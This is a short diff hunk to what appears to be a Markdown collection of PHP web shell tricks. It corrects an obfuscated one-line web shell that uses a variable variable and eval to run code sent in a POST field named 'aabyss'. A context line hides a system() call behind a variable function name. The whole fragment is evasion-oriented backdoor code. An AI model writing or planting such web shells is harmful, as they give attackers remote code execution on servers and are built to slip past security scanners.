@@ -1258,7 +1258,7 @@ $f($_POST['aabyss']);        //sysTem($_POST['aabyss']);
 
 ```php
 $f = 'hello';
-$$z = $_POST['aabyss'];
+$$f = $_POST['aabyss'];
 eval(``.$hello);
 ```
 
